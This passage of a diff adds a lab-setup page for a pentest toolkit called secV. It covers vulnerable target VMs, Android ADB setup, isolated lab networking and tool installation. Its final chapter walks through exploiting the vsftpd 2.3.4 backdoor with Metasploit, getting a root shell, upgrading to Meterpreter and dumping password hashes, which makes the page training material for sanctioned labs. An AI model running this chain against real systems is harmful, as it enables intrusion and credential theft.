+    <p class="ch-sub">You need safe, legal targets to practice against. These are VMs built to be vulnerable — they're designed to be attacked.</p>
+
+    <h3>Metasploitable 3 — Linux target</h3>
+    <p><strong>Metasploitable 3</strong> is a purposefully vulnerable Linux server from Rapid7 (the Metasploit company). It has dozens of exploitable services: FTP, SSH, HTTP, SMB, databases — all misconfigured or running old versions.</p>
+    <pre><code><span class="cm"># Option 1: Download pre-built OVA from Rapid7</span>
+<span class="cm"># Search: "Metasploitable 3 download" → rapid7 GitHub releases</span>
+<span class="cm"># Import to VirtualBox: File → Import Appliance</span>
+
+<span class="cm"># Option 2: Build from Vagrant (requires VirtualBox + Vagrant)</span>
+git clone https://github.com/rapid7/metasploitable3.git
+cd metasploitable3
+vagrant up ub1404   <span class="cm"># builds Ubuntu 14.04 vulnerable VM</span></code></pre>
+
+    <p>Set Metasploitable's network adapter to <strong>host-only</strong> (same lab network as Kali). Then from Kali:</p>
+    <pre><code><span class="cm"># Find Metasploitable's IP</span>
+nmap -sn 192.168.100.0/24
+<span class="cm"># Look for the new host — that's your target</span>
+<span class="cm"># Default creds: vagrant/vagrant or ubuntu/ubuntu</span></code></pre>
+
+    <h3>DVWA — web application target</h3>
+    <p><strong>DVWA (Damn Vulnerable Web App)</strong> is a PHP web application with intentional SQLi, XSS, CSRF, file upload, command injection vulnerabilities at adjustable difficulty. Perfect for practicing secV's <code>websec</code> module.</p>
+    <pre><code><span class="cm"># Run DVWA as Docker on Kali (easiest method)</span>
+sudo apt install docker.io -y
+sudo docker pull vulnerables/web-dvwa
+sudo docker run -d -p 8080:80 vulnerables/web-dvwa
+
+<span class="cm"># Access at http://localhost:8080</span>
+<span class="cm"># Default: admin/password</span>
+<span class="cm"># Click Setup/Reset DB to initialize</span></code></pre>
+
+    <h3>VulnHub VMs — variety of targets</h3>
+    <p><strong>VulnHub</strong> (<code>vulnhub.com</code>) offers hundreds of free vulnerable VMs across all difficulty levels. Download the VM for any machine you want to practice against, import to VirtualBox/KVM, and attach to your host-only network. Same pattern as Metasploitable.</p>
+    <p>Good starter VMs: <strong>Kioptrix Level 1</strong>, <strong>Mr. Robot</strong>, <strong>Bashed</strong>, <strong>Blue</strong>.</p>
+  </div>
+
+  <!-- CHAPTER 7: ANDROID TARGET -->
+  <div class="chapter" id="android-target">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">07</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Mobile Target</span>
+    </div>
+    <h2 class="ch-title">Android Emulator — <em>Virtual Phone</em></h2>
+    <p class="ch-sub">Testing android_pentest operations without a physical device. The Android emulator runs a full Android system on your x86 CPU.</p>
+
+    <h3>Option A: Android Studio AVD (most compatible)</h3>
+    <ol class="step-list">
+      <li><div>Install Android Studio from <code>developer.android.com/studio</code>. On Kali: <code>sudo snap install android-studio --classic</code> or download the tar.gz and extract.</div></li>
+      <li><div>Open Android Studio → Virtual Device Manager → Create Device. Choose <strong>Pixel 4</strong> (or any phone). Select system image: <strong>Android 11 (API 30)</strong> — Google APIs version (includes Play Store) or plain AOSP (no Play Protect, easier for testing).</div></li>
+      <li>
+        <div>Start the AVD. Then connect ADB to it from Kali:
+          <pre><code>adb devices
+<span class="cm"># emulator-5554  device</span>
+adb -s emulator-5554 shell getprop ro.product.model
+<span class="cm"># sdk_gphone_x86</span></code></pre>
+        </div>
+      </li>
+    </ol>
+
+    <h3>Option B: Android-x86 VM (lighter weight)</h3>
+    <p>Android-x86 is a port of Android to run as a standard VM — smaller than Android Studio. Download ISO from <code>android-x86.org</code>:</p>
+    <pre><code><span class="cm"># Create VM in VirtualBox/KVM:</span>
+<span class="cm"># - Type: Linux, Other Linux (64-bit)</span>
+<span class="cm"># - RAM: 2 GB</span>
+<span class="cm"># - Disk: 8 GB</span>
+<span class="cm"># - Network: host-only (same lab network as Kali)</span>
+<span class="cm"># Boot from Android-x86 ISO, select "Install to hard disk"</span>
+
+<span class="cm"># After boot, find the Android VM's IP:</span>
+<span class="cm"># In Android: Settings → About tablet → IP address</span>
+
+<span class="cm"># Enable ADB over TCP on the Android VM:</span>
+<span class="cm"># In Android-x86 terminal (hold Alt+F1 for console):</span>
+setprop service.adb.tcp.port 5555
+stop adbd && start adbd
+
+<span class="cm"># From Kali, connect:</span>
+adb connect 192.168.100.xxx:5555
+adb devices
+<span class="cm"># 192.168.100.xxx:5555  device</span></code></pre>
+
+    <h3>Using a physical Android device</h3>
+    <p>For physical devices (the primary use case for android_pentest):</p>
+    <ol class="step-list">
+      <li><div><strong>Enable Developer Mode:</strong> Settings → About Phone → tap "Build number" 7 times until "Developer options" unlocked</div></li>
+      <li><div><strong>Enable USB Debugging:</strong> Settings → Developer Options → USB Debugging → ON</div></li>
+      <li><div>Connect via USB to Kali and accept the RSA key prompt on the phone</div></li>
+      <li>
+        <div><strong>Enable ADB over WiFi</strong> (so you can disconnect USB for wireless testing):
+          <pre><code>adb tcpip 5555
+<span class="cm"># Unplug USB. Find phone IP in Settings → WiFi → IP address</span>
+adb connect 192.168.1.xxx:5555
+adb devices</code></pre>
+        </div>
+      </li>
+      <li><div>For USB passthrough to a VM: In VirtualBox (VM settings → USB → add filter for your Android device). In KVM: use virt-manager → Add Hardware → USB Host Device.</div></li>
+    </ol>
+  </div>
+
+  <!-- CHAPTER 8: NETWORK DESIGN -->
+  <div class="chapter" id="lab-network">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">08</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Networking</span>
+    </div>
+    <h2 class="ch-title">Lab Network <em>Design</em></h2>
+    <p class="ch-sub">Network configuration is where most beginners get stuck. Understanding exactly what traffic goes where prevents accidents — like scanning a real target — and makes lab operations work correctly.</p>
+
+    <h3>The recommended lab topology</h3>
+    <div class="arch-box"><span class="cm">
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │                        HOST MACHINE                                 │
+  │                                                                     │
+  │   ┌──────────────────────┐        ┌──────────────────────────────┐  │
+  │   │     KALI VM           │        │    TARGET VMs                │  │
+  │   │                      │        │  (Metasploitable, Android)   │  │
+  │   │  NIC 1: 192.168.100.x│◄──────►│        192.168.100.x         │  │
+  │   │  (host-only network) │        │        (host-only)           │  │
+  │   │                      │        └──────────────────────────────┘  │
+  │   │  NIC 2: NAT          │                                          │
+  │   │  (outbound internet  │─────────────────────────────────►[WAN]   │
+  │   │   for downloads)     │   (HOST NAT → internet, inbound blocked) │
+  │   └──────────────────────┘                                          │
+  │                                                                     │
+  │   virbr-lab: 192.168.100.1/24  (host bridge — visible to VMs)       │
+  └─────────────────────────────────────────────────────────────────────┘
+</span></div>
+
+    <p>Key properties of this design:</p>
+    <ul>
+      <li>Kali ↔ Target VMs: <strong>full bidirectional access</strong> via host-only (192.168.100.0/24)</li>
+      <li>Target VMs → Internet: <strong>blocked</strong> — they have no NAT adapter</li>
+      <li>Kali → Internet: <strong>allowed</strong> via NAT adapter — needed for apt, pip, bore tunnel</li>
+      <li>Internet → Kali VM: <strong>blocked</strong> by NAT — attacker stays protected</li>
+      <li>Internet → Target VMs: <strong>completely blocked</strong> — safe</li>
+    </ul>
+
+    <div class="callout warn">
+      <span class="callout-mark">!</span>
+      <span>Never give target VMs a NAT adapter unless you specifically need to test WAN operations. An internet-connected vulnerable VM can be found and compromised by real attackers within minutes of exposure.</span>
+    </div>
+  </div>
+
+  <!-- CHAPTER 9: NETWORK MODES EXPLAINED -->
+  <div class="chapter" id="network-modes">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">09</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Networking</span>
+    </div>
+    <h2 class="ch-title">Network Adapter <em>Modes Explained</em></h2>
+    <p class="ch-sub">Every VM network adapter has a mode that determines how it connects to the world. Understanding these saves hours of confusion.</p>
+
+    <div class="table-wrap"><table>
+      <thead><tr><th>Mode</th><th>VM→Host</th><th>VM→Other VMs</th><th>VM→Internet</th><th>Internet→VM</th><th>Use for</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Host-Only</strong></td><td>Yes</td><td>Yes (same host)</td><td>No</td><td>No</td><td>Isolated lab network between VMs. <em>Use for target VMs.</em></td></tr>
+        <tr><td><strong>NAT</strong></td><td>No (by default)</td><td>No</td><td>Yes (outbound only)</td><td>No</td><td>Internet access from a VM without exposing it. <em>Use for Kali's 2nd adapter.</em></td></tr>
+        <tr><td><strong>Bridged</strong></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>VM appears as a real machine on your LAN. <em>Use when testing real-device ADB WiFi — phone and Kali on same network.</em></td></tr>
+        <tr><td><strong>Internal</strong></td><td>No</td><td>Yes (same host)</td><td>No</td><td>No</td><td>Completely isolated — VMs talk to each other only, not even host. <em>Advanced: isolated victim-only networks.</em></td></tr>
+      </tbody>
+    </table></div>
+
+    <h4>IP address ranges by adapter</h4>
+    <div class="net-row">
+      <div class="net-cell"><div class="net-cell-head">Host-Only</div><div class="net-cell-val">192.168.100.x</div><div class="net-cell-sub">or 192.168.56.x (VBox default)</div></div>
+      <div class="net-cell"><div class="net-cell-head">NAT</div><div class="net-cell-val">10.0.2.x</div><div class="net-cell-sub">VirtualBox NAT default subnet</div></div>
+      <div class="net-cell"><div class="net-cell-head">Bridged</div><div class="net-cell-val">192.168.1.x</div><div class="net-cell-sub">Your real home/office LAN range</div></div>
+      <div class="net-cell"><div class="net-cell-head">Host Bridge (KVM)</div><div class="net-cell-val">192.168.100.1</div><div class="net-cell-sub">virbr-lab — host's interface into lab</div></div>
+    </div>
+  </div>
+
+  <!-- CHAPTER 10: INSTALL secV -->
+  <div class="chapter" id="install-secv">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">10</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Installation</span>
+    </div>
+    <h2 class="ch-title">Installing <em>secV</em></h2>
+    <p class="ch-sub">secV runs on Kali Linux inside your VM (or bare metal). The installer handles all dependency detection and compilation.</p>
+
+    <h3>Quick install</h3>
+    <pre><code><span class="cm"># Clone the repository</span>
+git clone https://github.com/secvulnhub/secV.git
+cd secV
+
+<span class="cm"># Run the installer (detects distro automatically)</span>
+chmod +x install.sh
+./install.sh
+
+<span class="cm"># What install.sh does:</span>
+<span class="cm"># 1. Detects distro (Arch/Debian/Fedora/Alpine/macOS)</span>
+<span class="cm"># 2. Installs system packages via package manager</span>
+<span class="cm"># 3. Installs Python packages from rqm.md</span>
+<span class="cm"># 4. Compiles the Go binary: go build -ldflags="-s -w" -o secV .</span>
+<span class="cm"># 5. Optionally installs system-wide to /usr/local/bin/secV</span></code></pre>
+
+    <h3>Verify installation</h3>
+    <pre><code><span class="cm"># Check binary version</span>
+./secV --version
+
+<span class="cm"># Run the dependency check (shows ✓/✗ for every module and dep)</span>
+./secV -check-deps
+
+<span class="cm"># Start the shell</span>
+./secV
+
+<span class="cm"># Expected output:</span>
+<span class="hl">   ███████╗███████╗ ██████╗██╗   ██╗
+   ██╔════╝██╔════╝██╔════╝██║   ██║
+   ███████╗█████╗  ██║     ██║   ██║
+   ╚════██║██╔══╝  ██║     ╚██╗ ██╔╝
+   ███████║███████╗╚██████╗ ╚████╔╝
+   ╚══════╝╚══════╝ ╚═════╝  ╚═══╝</span>
+
+secV ❯</code></pre>
+
+    <h3>secV file layout</h3>
+    <pre><code>secV/
+├── <span class="kw">secV</span>                   <span class="cm"># compiled Go binary — the shell</span>
+├── <span class="kw">main.go</span>                <span class="cm"># Go source: REPL, command parser, module loader</span>
+├── install.sh             <span class="cm"># multi-distro installer</span>
+├── rqm.md                 <span class="cm"># all Python requirements (pip install -r)</span>
+├── update.py              <span class="cm"># self-update script: git pull + go build</span>
+├── gen_module.py          <span class="cm"># scaffold a new module interactively</span>
+└── tools/
+    ├── network/
+    │   ├── netrecon/      <span class="cm"># multi-engine port scanner + host fingerprinter</span>
+    │   ├── mac_spoof/     <span class="cm"># MAC address rotation daemon</span>
+    │   ├── wifi_monitor/  <span class="cm"># 23-mode WiFi attack suite</span>
+    │   └── revshell/      <span class="cm"># multi-session reverse shell handler</span>
+    ├── mobile/
+    │   ├── android/       <span class="cm"># full Android pentest: APK, BT HID, Frida, C2</span>
+    │   └── ios/           <span class="cm"># iOS pentest via libimobiledevice + Frida</span>
+    ├── web/
+    │   └── websec/        <span class="cm"># web attack surface: SQLI, XSS, CORS, WAF, dirs</span>
+    ├── AD/
+    │   ├── linux/         <span class="cm"># adsec: Linux-side AD pentest (15 operations)</span>
+    │   └── windows/       <span class="cm"># winadsec: Windows post-exploitation (37 ops)</span>
+    ├── ctf/
+    │   └── ctfpwn.py      <span class="cm"># CTF autopwn + flag extraction</span>
+    └── phys/
+        └── badusb/        <span class="cm"># PowerShell → base64 → DuckyScript converter</span></code></pre>
+  </div>
+
+  <!-- CHAPTER 11: HEALTH CHECK -->
+  <div class="chapter" id="health-check">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">11</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Verification</span>
+    </div>
+    <h2 class="ch-title">Lab <em>Health Check</em></h2>
+    <p class="ch-sub">Run these checks before every lab session to confirm your environment is ready. Takes 2 minutes.</p>
+
+    <pre><code><span class="cm"># ── 1. ADB — must show device before android_pentest ──────────────────</span>
+adb devices
+<span class="cm"># 192.168.100.xxx:5555  device    ← your Android target</span>
+<span class="cm"># emulator-5554         device    ← emulator if running</span>
+
+<span class="cm"># ── 2. Metasploit database ────────────────────────────────────────────</span>
+sudo msfdb status
+<span class="cm"># [+] Dependency is connected (database: msf)</span>
+
+<span class="cm"># ── 3. bore tunnel ────────────────────────────────────────────────────</span>
+bore --version
+<span class="cm"># bore 0.5.x</span>
+
+<span class="cm"># ── 4. secV dependencies ──────────────────────────────────────────────</span>
+./secV -check-deps
+<span class="cm"># Shows ✓/✗ per module. Fix any ✗ before trying that module.</span>
+
+<span class="cm"># ── 5. Network reachability ───────────────────────────────────────────</span>
+ping -c 2 192.168.100.xxx    <span class="cm"># target VM — must respond</span>
+curl -s ifconfig.me          <span class="cm"># must return an IP — confirms internet access</span>
+
+<span class="cm"># ── 6. Quick smoke test — recon localhost ─────────────────────────────</span>
+./secV
+secV ❯ use netrecon
+secV (netrecon) ❯ set mode quick
+secV (netrecon) ❯ run 127.0.0.1
+<span class="cm"># Should complete in &lt;5 seconds with port scan results</span></code></pre>
+  </div>
+
+  <!-- CHAPTER 12: FIRST ATTACK -->
+  <div class="chapter" id="first-attack">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">12</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">First Run</span>
+    </div>
+    <h2 class="ch-title">Your First <em>Lab Attack</em></h2>
+    <p class="ch-sub">End-to-end: discover a target VM, scan it, and get a shell. This is the full attack chain that every more advanced operation builds on.</p>
+
+    <h3>Step 1 — Discover the target</h3>
+    <pre><code>secV ❯ <span class="kw">use</span> netrecon
+secV (netrecon) ❯ <span class="kw">set</span> mode normal
+secV (netrecon) ❯ <span class="kw">run</span> 192.168.100.0/24
+
+<span class="cm"># Output shows all live hosts in the lab network</span>
+<span class="cm"># Find Metasploitable: look for open ports 21 (ftp), 22 (ssh), 80 (http), 445 (smb)</span>
+<span class="cm"># Note its IP — e.g. 192.168.100.110</span></code></pre>
+
+    <h3>Step 2 — Deep scan the target</h3>
+    <pre><code>secV (netrecon) ❯ <span class="kw">set</span> mode deep
+secV (netrecon) ❯ <span class="kw">run</span> 192.168.100.110
+
+<span class="cm"># Full service version scan. Output includes:</span>
+<span class="cm"># port 21/tcp  ftp     vsftpd 2.3.4    ← backdoor CVE-2011-2523</span>
+<span class="cm"># port 80/tcp  http    Apache 2.2.8</span>
+<span class="cm"># port 445/tcp smb     Samba 3.x</span>
+<span class="cm"># Risk score: 9.1 CRITICAL (many known CVEs)</span></code></pre>
+
+    <h3>Step 3 — Exploit a vulnerability (Metasploit)</h3>
+    <p>The FTP service is vsftpd 2.3.4 — this has a famous backdoor that allows command execution. The exploit is a single Metasploit module:</p>
+    <pre><code><span class="cm"># Start msfconsole and run the exploit</span>
+msfconsole -q
+
+msf6 ❯ use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 (vsftpd_234_backdoor) ❯ set RHOSTS 192.168.100.110
+msf6 (vsftpd_234_backdoor) ❯ run
+
+<span class="cm"># If vulnerable:</span>
+[*] 192.168.100.110:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] Command shell session 1 opened
+<span class="hl">$ whoami</span>
+root</code></pre>
+
+    <h3>Step 4 — Get a more stable Meterpreter shell</h3>
+    <pre><code><span class="cm"># Inside the command shell session, background it and upgrade:</span>
+msf6 ❯ background
+msf6 ❯ use post/multi/manage/shell_to_meterpreter
+msf6 ❯ set SESSION 1
+msf6 ❯ run
+
+<span class="cm"># Now interact with the Meterpreter session:</span>
+msf6 ❯ sessions -i 2
+meterpreter ❯ sysinfo
+meterpreter ❯ hashdump     <span class="cm"># dump password hashes</span>
+meterpreter ❯ upload /tmp/test.txt /tmp/  <span class="cm"># file transfer</span>
+meterpreter ❯ screenshot   <span class="cm"># capture screen</span></code></pre>
+
+    <div class="callout tip">
+      <span class="callout-mark">▶</span>
+      <span><strong>Congratulations</strong> — you just ran a complete attack chain: discovery → scan → exploit → persistence in a safe isolated lab. This is the same sequence every secV module automates, just at a higher abstraction level. Now you know what's happening under the hood.</span>
+    </div>
+
+    <h3>Taking and restoring snapshots</h3>
+    <p>Snapshot the target VM in its pristine state so you can reset it after every practice run:</p>
+    <pre><code><span class="cm"># VirtualBox — take snapshot</span>
+<span class="cm"># Machine → Take Snapshot → name it "clean-base"</span>
+
+<span class="cm"># VirtualBox CLI equivalent</span>
+VBoxManage snapshot "Metasploitable3" take "clean-base" --live
+
+<span class="cm"># KVM — take snapshot</span>
+sudo virsh snapshot-create-as metasploitable3 "clean-base" --disk-only
+
+<span class="cm"># Restore to clean state (KVM)</span>
+sudo virsh snapshot-revert metasploitable3 "clean-base"</code></pre>
+  </div>
+
+</main>
+
+<!-- RIGHT TOC -->
+<aside class="page-toc" id="toc">
+  <div class="toc-label">On this page</div>
+  <ul class="toc-list">
+    <li><a href="#why-lab">Why a VM Lab</a></li>
+    <li><a href="#host-requirements">Host Requirements</a></li>
+    <li><a href="#vbox">VirtualBox</a></li>
+    <li><a href="#kvm">QEMU/KVM</a></li>
+    <li><a href="#kali-vm">Kali Linux VM</a></li>
+    <li><a href="#target-vms">Target VMs</a></li>
+    <li><a href="#android-target">Android Target</a></li>
+    <li><a href="#lab-network">Network Design</a></li>
+    <li><a href="#network-modes">Network Modes</a></li>
+    <li><a href="#install-secv">Install secV</a></li>
+    <li><a href="#health-check">Health Check</a></li>
+    <li><a href="#first-attack">First Attack</a></li>
+  </ul>
+</aside>
+
+</div><!-- /page-layout -->
+
+<footer>
+  <div class="foot-inner">
+    <a class="foot-brand" href="index.html">SECVULNHUB</a>
+    <div class="foot-links">
+      <a class="foot-link" href="index.html">Home</a>
+      <a class="foot-link" href="foundations.html">Foundations</a>
+      <a class="foot-link" href="index.html#modules">Modules</a>
+      <a class="foot-link" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
+    </div>
+    <span style="font-size:0.52rem;color:var(--dim);">secV v2.4.2 — Lab Setup Guide</span>
+  </div>
+</footer>
+
+<script>
+const nav=document.getElementById('nav');
+window.addEventListener('scroll',()=>{nav.classList.toggle('scrolled',window.scrollY>20);});
+document.getElementById('burger').addEventListener('click',()=>{document.body.classList.toggle('nav-open');});
+
+// TOC active highlighting
+const chaps=document.querySelectorAll('.chapter[id]');
+const tocLinks=document.querySelectorAll('.toc-list a');
+const leftLinks=document.querySelectorAll('.chapter-nav a');
+const io=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const id=e.target.id;
+      tocLinks.forEach(l=>{l.classList.toggle('active',l.getAttribute('href')==='#'+id);});
+      leftLinks.forEach(l=>{l.classList.toggle('active',l.getAttribute('href')==='#'+id);});
+    }
+  });
+},{rootMargin:'-15% 0px -75% 0px'});
+chaps.forEach(c=>io.observe(c));
+</script>
+</body>
+</html>
